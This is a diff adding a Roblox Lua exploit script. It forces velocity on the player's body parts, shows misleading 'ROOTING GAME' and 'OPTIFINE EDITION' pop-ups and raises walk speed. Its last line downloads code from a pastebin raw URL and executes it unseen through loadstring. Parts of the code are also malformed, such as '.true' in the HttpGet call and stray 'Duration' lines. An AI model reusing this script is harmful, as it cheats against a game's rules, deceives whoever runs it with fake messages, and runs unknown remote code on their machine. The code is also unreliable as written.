@@ -1,0 +1,49 @@
+for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
+
+    if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
+
+    game:GetService("RunService").Heartbeat:connect(function()
+
+    v.Velocity = Vector3.new(-30,0,0)
+
+    end)
+
+    end
+
+    end
+
+    
+
+    game:GetService("StarterGui"):SetCore("SendNotification", { 
+
+        Title = "LAUNCHING GAME";
+
+        Text = "OPTIFINE EDITION SCRIPT ONLY IN PC AND MOBILE";
+
+        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+
+    Duration = 16;
+
+    
+
+    game:GetService("StarterGui"):SetCore("SendNotification", { 
+
+        Title = "ROOTING GAME...";
+
+        Text = "PLEASE MAKE SURE IS EDITION GAMES IN ROBLOX";
+
+        Button1 = "OK";
+
+        Button2 = "NO";
+
+        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+
+    Duration = 16;
+
+wait(1)
+
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 25
+
+wait(2)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/BUqNNcbD").true)();
